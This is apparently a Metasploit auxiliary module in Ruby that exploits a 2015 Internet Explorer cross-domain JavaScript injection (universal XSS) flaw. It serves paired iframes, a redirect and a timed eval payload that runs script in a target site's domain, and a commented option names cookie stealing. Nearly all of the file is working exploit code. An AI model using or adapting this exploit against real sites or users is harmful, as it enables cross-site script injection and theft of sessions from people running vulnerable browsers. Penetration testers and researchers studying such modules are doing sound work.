##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Microsoft Internet Explorer Cross-domain JavaScript Injection",
      'Description'    => %q{
        This is an example of building a browser exploit using the BrowserExploitServer mixin
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'References'     =>
        [
          [ 'URL', 'http://innerht.ml/blog/ie-uxss.html' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2015/Feb/10' ]
        ],
      'Platform'       => 'win',
      'DisclosureDate' => "Feb 2 2015"
    ))

    register_options(
    [
      OptString.new('TARGET_URI', [ true, 'The URL for the target iframe' ]),
      #OptString.new('CUSTOM_JS', [ false, 'Custom JavaScript to inject (default: cookie stealing)' ])
    ], self.class)
  end

  def setup
    if target_uri !~ /^http/i
      raise Msf::OptionValidateError.new(['TARGET_URI'])
    end

    super
  end

  def target_uri
    @target_uri ||= datastore['TARGET_URI']
  end

  def get_html
    @html ||= html
  end

  def html
    %Q|
<iframe src="#{get_resource}/redirect.php"></iframe>
<iframe src="#{datastore['TARGET_URI']}"></iframe>
<script>
    top[0].eval('_=top[1];with(new XMLHttpRequest)open("get","#{get_resource}/sleep.php",false),send();_.location="javascript:alert(document.domain)"');
</script>
    |
  end

  def run
    exploit
  end

  def on_request_uri(cli, request)
    print_status(request.uri)
    case request.uri
    when /redirect\.php/
      print_status("sending redirect")
      send_redirect(cli, "#{datastore['TARGET_URI']}")
    when /sleep.php/
      sleep(1)
      send_response(cli, '')
    else
      print_status("sending html")
      send_response(cli, get_html)
    end
  end

end
